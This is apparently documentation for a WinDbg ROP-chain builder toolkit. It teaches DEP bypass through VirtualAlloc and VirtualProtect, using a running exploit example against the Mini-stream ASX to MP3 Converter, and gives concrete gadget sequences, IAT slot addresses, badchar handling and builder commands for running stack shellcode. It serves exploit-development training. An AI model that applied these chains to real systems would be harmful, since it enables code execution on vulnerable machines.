# Chain commands: which one, when, and why

This is the canonical guide to the ROP dispatch builders (`slot_call`,
`chain_*`, `frame_*`, `frame_write`). If you only read one section, read
[Decision table](#decision-table). If you're new to the *why*, start at
[Theory](#theory-the-mental-model).

> **This guide is target-agnostic.** The builders read whatever corpus you load
> and choose gadgets by capability — nothing here is hardcoded to a particular
> DLL or register (e.g. `slot_call` composes its deref/dispatch through *any*
> register, not just `eax`). Concrete addresses in the examples
> (`0x1005D060`, `0x10075A4B`, filter03, …) come from **one running worked
> example — the Mini-stream "ASX to MP3 Converter"** — and are there to make the
> steps concrete. On your own target, run the **queries each section names**
> (`sc.iat_find`, `rop.query`, `code_caves`, …) to find the equivalents; the
> commands report honestly when a required primitive is absent from *your*
> corpus.

- [Theory: the mental model](#theory-the-mental-model)
- [Slot vs target](#slot-vs-target-read-this-first)
- [Decision table](#decision-table)
- [The dispatch spectrum](#the-dispatch-spectrum)
- [Addresses: nulls vs volatility](#addresses-nulls-vs-volatility)
- [Filling in BUF and SHELLCODE](#filling-in-buf-and-shellcode)
- [Command reference](#command-reference)
- [Common mistakes](#common-mistakes)
- [slot_call — live validation checklist](#slot_call--live-validation-checklist)

---

## Theory: the mental model

**The problem is DEP/NX, not writing.** A buffer overflow lets you *write*
anything to the stack — the stack is writable. What you cannot do is *execute*
it: DEP marks the stack non-executable, so the instant `EIP` points into stack
memory the CPU faults. "Overwrite memory and run it" fails at the run step.

**The fix is to flip the permission, then jump.** Windows exposes calls that
change page protection at runtime:

- **VirtualAlloc** with `MEM_COMMIT` + `PAGE_EXECUTE_READWRITE` on an
  already-committed page **re-commits that page as RWX**.
- **VirtualProtect** changes protection on an existing region to RWX.

Point either at **the stack page holding your shellcode**, and the stack becomes
executable. Return into the shellcode → it runs. That is the whole goal.

**Why ROP.** To call VirtualAlloc you must execute instructions that set up its
arguments and call it. But your only injected code is the stack shellcode —
exactly what you can't execute yet (chicken-and-egg). So you borrow instruction
fragments that are *already* executable — snippets ending in `ret` inside loaded
modules — and chain them via `ret`. ROP is borrowed execution that performs the
one privileged action (the permission flip) which unlocks your shellcode.

### Memory map (internalize this)

```
STACK  (writable, NX — controlled by the overflow)
┌────────────────────────────────────────────────┐
│ padding …                                        │
│ saved EIP  ── overwritten → first pivot/gadget   │  control transfer starts here
│ ROP CHAIN  (filter03 gadget addresses + data     │
│            words: BUF, slot, args …)             │  runs by walking down via ret
│ SHELLCODE  (your raw payload bytes)              │  lives HERE, on the stack
└────────────────────────────────────────────────┘

FILTER03.dll  (non-ASLR, at its preferred base)
┌────────────────────────────────────────────────┐
│ .text  → the GADGETS (borrowed executable code)  │  ROP borrows instructions here
│ .data  → BUF (writable scratch workbench)        │  where the call frame is assembled
│ .idata → the IAT SLOT 0x1005D060                 │  stable pointer to the ASLR'd API
└────────────────────────────────────────────────┘

KERNEL32.dll  (ASLR'd — address changes each boot)
┌────────────────────────────────────────────────┐
│ VirtualAlloc code @ 0x76E25680  (the "target")   │  *slot points here; you jmp into it
└────────────────────────────────────────────────┘
```

Three regions, three jobs:

- **Stack** — holds the ROP chain *and* the shellcode. `SHELLCODE` is a **stack
  address**, never a filter03 address.
- **filter03** — supplies the borrowed instructions (`.text`), the writable
  scratch buffer (`.data` = BUF), and the stable IAT slot.
- **kernel32** — where the API actually lives; never hardcoded, only reached by
  dereferencing the slot.

### Two separate write phases

1. **The overflow write** — happens once, when the bug fires. Sprays the whole
   payload (ROP chain + shellcode) onto the stack. Constrained by badchars.
2. **The ROP writes** — happen at runtime, as the chain executes `mov [eax],ecx`
   into BUF. This is how you place bytes you *couldn't* put in phase 1 — the
   null-bearing args. BUF exists **only** because of this. If your frame had no
   badchar words you'd lay it flat on the stack (`frame_*`) and skip BUF.

### End-to-end sequence (slot_call)

```
overflow → EIP = pivot → ESP walks the ROP chain on the stack
  → chain writes [pop eax; slot; mov eax,[eax]; jmp eax; retaddr; args] into BUF
  → pop eax = BUF ; xchg eax, esp                 (ESP now points at BUF)
  → ret runs BUF: pop eax=slot → mov eax,[eax] (eax = live API) → jmp eax
  → VirtualAlloc(lpAddress = SHELLCODE_on_stack, dwSize, MEM_COMMIT, RWX)
       …flips the stack page to executable…
  → returns to retaddr = SHELLCODE  (back on the stack, now executable)
  → shellcode runs
```

---

## Slot vs target (read this first)

The single most common confusion. Be precise:

| Term | What it is | ASLR? | Where it goes |
|------|-----------|-------|---------------|
| **Target** | the API's real code address (`kernel32!VirtualAlloc` @ `0x76E25680`) | **ASLR'd** — changes every boot | never hardcode it |
| **Slot** | a 4-byte IAT cell in a module that *holds* the target (`0x1005D060` in filter03) | fixed if the module is non-ASLR | this is the literal you put in the payload |

The slot **contains** the target:

```
dd 0x1005D060  ->  76e25680      (*slot == target)
```

- `sc.iat_find("VirtualAlloc")` lists both columns. Pick a **slot in a non-ASLR
  module** (Mini-stream: `MSA2Mfilter03.dll`); the target is identical for every
  kernel32 importer.
- **Never `u` a slot** — it is data, not code; `u` disassembles the pointer bytes
  into garbage. Use `dd <slot> L1` to read the target out of it.

---

## Decision table

| You have… | ASLR? | PUSHAD gadget? | Use | First arg you pass |
|-----------|-------|----------------|-----|--------------------|
| a **slot** (want reboot-stable) | yes | — | **`rop.slot_call`** | the **slot** |
| the **target** address | no / one-shot | yes | `rop.chain_va` / `chain_vp` / `chain_wpm` | the **target** |
| the **target** address | no / one-shot | no | `rop.frame_va` / `frame_vp` / `frame_wpm` | the **target** |
| the **target**, want the frame built by gadgets in a buffer | no / one-shot | no | `rop.frame_write` | the **target** (word0) |

> **ASLR-proof ⇒ `slot_call`.** Every other builder dispatches into an address
> you supply with **no dereference**, so that address must be the real code
> target. Feed those a slot and the chain `ret`s into data and crashes — see
> [Common mistakes](#common-mistakes).

---

## The dispatch spectrum

All builders end at `EIP = <API>`; they differ only in how they get there and
lay out the stdcall frame.

- **`slot_call`** — `pop <ptr>=<slot> ; mov <val>,[<ptr>] ; jmp <val>`.
  Dereferences the slot at runtime, so the ASLR'd target is fetched on the box
  and never appears in the payload. The deref/dispatch register is chosen from
  the corpus (any register, or a two-register `mov <val>,[<ptr>]` split), ranked
  stable-first. Null/badchar words are synthesised in a register and stored.
  **The only ASLR-proof builder.**
- **`chain_*`** — sets registers with `pop` gadgets, then `pushad ; ret` packs
  them into the frame and dispatches by `ret`-ing into **EDI**. EDI must be the
  real target. Needs a PUSHAD gadget; in "direct" mode `dwSize` is forced to the
  saved `ESP` (a warning prints).
- **`frame_*`** — lays `[target][retaddr][args…]` on the stack as **flat data
  words**. No corpus, no gadgets. Every value is badchar-checked, so `target`
  and any null-bearing arg must be badchar-free as literals.
- **`frame_write`** — builds that same flat frame in a **writable buffer** via
  `mov [eax],reg` stores, then pivots `ESP` onto it. Use when frame words contain
  badchars/nulls that can't sit in the payload. (Its `[0xSLOT]` word derefs via
  `mov <storereg>,[ptr]` — only on corpora that have such a load into a store
  register; filter03 does not, which is why `slot_call` exists.)

---

## Addresses: nulls vs volatility

These look like one problem but are two. A stack address like `0x000fc4c4` is
both **null-bearing** (`C4 C4 0F 00`) and **volatile** (moves under stack ASLR).

### Null bytes — solved by runtime construction
`slot_call`/`frame_write` **construct** any badchar word in a register with
badchar-free operands and store it, so the null never enters the payload. You've
seen it for the args, e.g. `dwSize = 0x00001000`:

```
pop edx ; edx = 0x01010101
pop ebx ; ebx = 0xFEFF0EFF          ; 0x01010101 + 0xFEFF0EFF ≡ 0x00001000 (mod 2^32)
add edx, ebx                         ; edx = 0x00001000  built at runtime
mov [eax], edx                       ; stored into the frame
```

The same two-add works for a null-bearing **address**. Pass the concrete value
and it's constructed like any other word:

```js
dx @$osed().rop.slot_call("0x<buf>", "0x1005D060",
    "0x000fc4c4 0x000fc4c4 0x1000 0x1000 0x40", "00 0A 0D")
```

### Precision — you need less than you think
- **VirtualAlloc rounds `lpAddress` down to the page.** Any address in the
  shellcode's 4 KB page works — pick a convenient value within it.
- **A NOP sled gives `retaddr` slack.** `retaddr` only has to land *somewhere*
  in the sled, not on the first shellcode byte.

### Volatility — the real limiter
Constructing `0x000fc4c4` only works if the stack lands there again next run.
Under stack ASLR a hardcoded stack address (even one built via arithmetic) is
fragile. There are two ways out; which is available depends on the corpus.

**(a) Register-relative addressing.** Derive the shellcode address from `ESP` at
runtime so it tracks wherever the stack lands:

```
mov reg, esp ; add reg, <calibrated offset>     ; reg = shellcode address, this run
```

This needs a gadget that **reads ESP into a general register** (`mov reg, esp`,
`lea reg,[esp+N]`, `push esp ; pop reg`, or `xchg reg, esp`). **Mini-stream /
filter03 does not have one** — every ESP gadget writes *to* ESP (`mov esp, reg`,
i.e. pivots). So register-relative addressing is *not available* on this target,
and the planned `rop.slot_call_rel` is **not buildable here**. Verify on any
target with `rop.query("capability","STACK_COPY")` (and check for `push esp`).

**(b) Stable code-cave destination (the recommended ASLR path here).** Instead
of returning to the volatile stack, stage the shellcode into a **non-ASLR code
cave** (see `code_caves("MSA2Mfilter03.dll")`) and jump to that *fixed* address.
The destination is then hardcodable and reboot-stable. It costs a copy step
(WriteProcessMemory, or word-by-word writes into the cave) — a separate design,
worth building when ASLR is actually enabled.

**Rule of thumb:** stable lab stack → construct the fixed address with
`slot_call`. Stack ASLR on, and the corpus can read ESP → register-relative.
Stack ASLR on, no ESP-read (filter03) → stage into a stable code cave.

---

## Filling in BUF and SHELLCODE

`slot_call` prints two placeholders you must define. They are different regions
with different jobs — do not conflate them.

### `BUF` — the writable staging buffer (filter03 `.data`)
Scratch space where the frame is assembled by writes, then `ESP` pivots onto it.

- **Writable** — the chain stores 9+ words into it.
- **Stable (non-ASLR)** — its address is hardcoded in the payload; use filter03
  `.data`.
- **Badchar-free** — `00 0A 0D` clean.
- **Room around it** — after the pivot, `ESP` sits at `BUF+0x10` and the API
  pushes/uses stack **downward** from there while your frame occupies
  `BUF+0x00..0x20`. Pick an address with writable slack on both sides; don't put
  BUF at a section edge or overlap the running ROP chain.

Find one with **`code_caves`** — the canonical way, since it already filters to
writable, sized regions:

```
dx @$osed().code_caves("MSA2Mfilter03.dll")
```

Pick a large `.data` cave that is `R W` (not `X`) and use an address a little
inside it (leaving slack above for the frame and below for the API's call-time
stack). On Mini-stream the biggest is a ~72 KB cave at `0x10075A4B`. Confirm any
candidate is writable before relying on it:

```
dd 0x<buf> L1
ed 0x<buf> 0x41414141
dd 0x<buf> L1        ; value changed -> writable
```

(`!address 0x10000000` also works but shows unfiltered regions.)

### `SHELLCODE` — your shellcode's runtime stack address
Both `SHELLCODE` slots take the address where your payload bytes sit at
exploitation time (usually right after the ROP chain on the stack). They fill two
VirtualAlloc roles; for the re-commit-in-place pattern they're the same value:

| frame slot | role | value |
|------------|------|-------|
| `retaddr` (`BUF+0x10`) | where VirtualAlloc returns; must be executable | shellcode address |
| `lpAddress` (`BUF+0x14`) | the page VirtualAlloc re-commits | shellcode address (same page) |

Resolve it from your crash layout — it's where the shellcode lands, e.g. from
`dds esp` after triage. It **can't** be a pre-known literal, which is why it's a
placeholder. Under stack ASLR, prefer `slot_call_rel` and calibrate the offset
once instead of hardcoding.

Define them in the exported stub:

```python
WRITABLE_BUF = 0x10060000   # writable, stable filter03 .data with slack — verify with !address
SHELLCODE    = 0x000FC4C4   # runtime shellcode address — verify with dds esp (volatile: see above)
```

---

## Command reference

Run `dx @$osed().rop.<name>("help")` for live help on any of these.

### `rop.slot_call(buf, iatSlot, "retaddr arg1 arg2 …", badchars?)` — ASLR-proof

```js
// VirtualAlloc via its filter03 IAT slot; return into shellcode after re-committing RWX.
dx @$osed().rop.slot_call("0x00420000", "0x1005D060",
    "SHELLCODE SHELLCODE 0x1000 0x1000 0x40", "00 0A 0D")
```
- `iatSlot` — the **slot** (`0x1005D060`), *not* the target.
- frame words = `retaddr` (must be executable) then the stdcall args in order.
  VirtualAlloc: `lpAddress dwSize flAllocationType flProtect`.
- `buf` — writable, stable, badchar-free staging address.
- Warns if any deref-preamble gadget is at a relocating address.

### `rop.slot_call_rel(…)` — stack-relative *(planned; not buildable on filter03)*

Would make frame words **register-relative** (ESP-derived, once-calibrated) so a
volatile stack address is never hardcoded. It requires a gadget that reads ESP
into a general register — which **Mini-stream/filter03 does not have** (see
[Volatility](#volatility--the-real-limiter)). Not implemented, and not feasible
on this corpus; for ASLR here use the **stable code-cave destination** approach
instead. On other targets, confirm feasibility with
`rop.query("capability","STACK_COPY")`.

### `rop.chain_va / chain_vp / chain_wpm(targetAddr, …)` — PUSHAD, needs the target

```js
dx @$osed().rop.chain_va(0x76E25680)   // pass the TARGET, not the slot
```
Reboot-fragile (target is ASLR'd). Requires a `pushad ; ret` gadget.

### `rop.frame_va / frame_vp / frame_wpm(targetAddr, …, badchars)` — flat, needs the target

```js
dx @$osed().rop.frame_va(0x76E25680, 0x625011AF, 0, 0x1000, 0x1000, 0x40, "00 0A 0D")
```
No corpus needed. `target` + null args must be badchar-free literals.

### `rop.frame_write(buf, "word0 word1 arg1 …", badchars?)` — write-built flat frame

```js
dx @$osed().rop.frame_write("0x00420000",
    "0x76E25680 POST_CALL 0x0 0x1000 0x3000 0x40", "00 0A 0D")
```
word0 = target (ret dispatches into it), word1 = post-call target, then args.
Null words are synthesised in a register and stored.

### Building blocks

- `rop.construct(reg, value, badchars, preserve?)` — build one badchar-tainted
  value in a register; reports clobbers.
- `rop.setup("reg=val reg=val …", badchars?)` — pack several register targets.
- `rop.pivots(register?, minDelta?)` — find/rank stack pivots.

---

## Common mistakes

- **Passing a slot to `chain_va` / `frame_va`.** They dispatch into the address
  as code. `rop.chain_va(0x1005D060)` sets `EDI = 0x1005D060`; `pushad ; ret`
  then `ret`s into the slot's data bytes → access violation (EIP lands on the
  pointer value, e.g. `1005d060`, executing nonsense). **Fix:** use
  `rop.slot_call("…","0x1005D060",…)`, or pass the *target* to `chain_va`.
- **Hardcoding the target for a reboot-stable exploit.** `0x76E25680` is ASLR'd.
  Fine for one run / ASLR-off; use `slot_call` otherwise.
- **Hardcoding a volatile stack address under stack ASLR.** Constructing the
  null-bearing value isn't enough if the stack moves — use `slot_call_rel`.
- **Using a slot from a relocating module.** On Mini-stream only `filter03` sits
  at its preferred base; other modules' slot addresses drift each launch. Re-run
  `sc.iat_find` after a relaunch and take the fresh filter03 slot.
- **`u`-ing a slot.** It's data. Use `dd <slot> L1`.
- **Confusing BUF with SHELLCODE.** BUF is filter03 `.data` scratch; SHELLCODE is
  a stack address. `lpAddress` = SHELLCODE (the stack), never BUF.

---

## slot_call — live validation checklist

A generated chain is a *hypothesis*. The planner reasons from the corpus model;
these steps prove it against the running process. Run them once per chain before
relying on it. (Addresses below are from the Mini-stream worked example —
substitute your own.)

### 1. Verify the load-bearing gadgets by disassembly
The planner annotates each step, but confirm the two kinds that carry alignment
risk:

- **Every `ret N` gadget.** A `ret N` pops the next address *and then* skips N
  bytes, so its compensation padding must sit **after** the following gadget, not
  before it. Disassemble and confirm the N matches the padding count (N/4 words):
  ```
  u 0x10029F3E L3      ; e.g. add edx,ebx ; pop ebx ; ret 0x10  -> 1 junk + 4 pad
  ```
  Walk the stack: the `ret N` gadget's own address, then its side-effect pop(s)
  (`junk`), then the *next* gadget address (which `ret N` pops into EIP), then
  N/4 `padding` words (which `ret N` skips). If EIP would land on `0x41414141`,
  the padding is misplaced — stop and report it.
- **The store gadget.** Confirm it's `mov [<cursor>], <reg> ; ret` and note
  whether its terminator is `ret` or `ret N` (that changes the padding):
  ```
  u 0x10010B48 L2      ; mov [eax],edx ; ret   (plain ret -> no padding of its own)
  ```
- **Any arithmetic gadget must preserve the write cursor** (`eax` by default).
  `add edx,ebx ; pop ebx ; ret 0x10` touches edx/ebx/esp but not eax — good. If
  an arithmetic step writes the cursor register, the frame walk desyncs.

### 2. Confirm the deref resolves (single-step the preamble)
After the pivot, step through `pop <ptr> → mov <val>,[<ptr>] → jmp <val>`:

- `dd <slot> L1` — the slot holds the live (ASLR'd) API address (the *target*).
- After `mov <val>,[<ptr>]`, that register equals the slot's contents.
- `jmp <val>` lands in the API's module (e.g. `KERNEL32!VirtualAllocStub`), not
  in data and not on `0x41414141`.

### 3. Check BUF placement
- BUF is **writable, stable, badchar-free**, and sits **inside a code cave** with
  room both above (the frame) and below (the API's downward call-time stack).
  Prefer **mid-cave**, not the cave's first byte:
  ```
  dd 0x<buf> L1 ; ed 0x<buf> 0x41414141 ; dd 0x<buf> L1   ; write must stick
  ```

### 4. Check the target page and args (VirtualAlloc/VirtualProtect)
- `lpAddress & 0xFFFFF000` is the page that gets re-committed RWX. Confirm the
  **whole** shellcode + NOP sled fits in `dwSize` bytes from that page base; bump
  `dwSize` (e.g. `0x2000`) if it crosses a page.
- `retaddr` lands **inside the NOP sled** of the now-RWX page.
- Re-take `dds esp` **with the full chain in place** — the chain shifts the sled
  to a higher address than a bare-payload test showed.

### 5. Confirm no badchars in the final bytes
Every gadget address and literal must avoid the badchar set; null/badchar values
must be *constructed*, never placed raw. If the planner reports success with your
badchar set, this holds by construction — but re-check after any manual edit.

---

## See also

- [ROP_WORKFLOW.md](ROP_WORKFLOW.md) — end-to-end chain construction.
- [ROP_API_REFERENCE.md](ROP_API_REFERENCE.md) — stdcall, PUSHAD, per-API
  register maps, constants.
- [GADGET_DISCOVERY.md](GADGET_DISCOVERY.md) — finding and verifying gadgets.
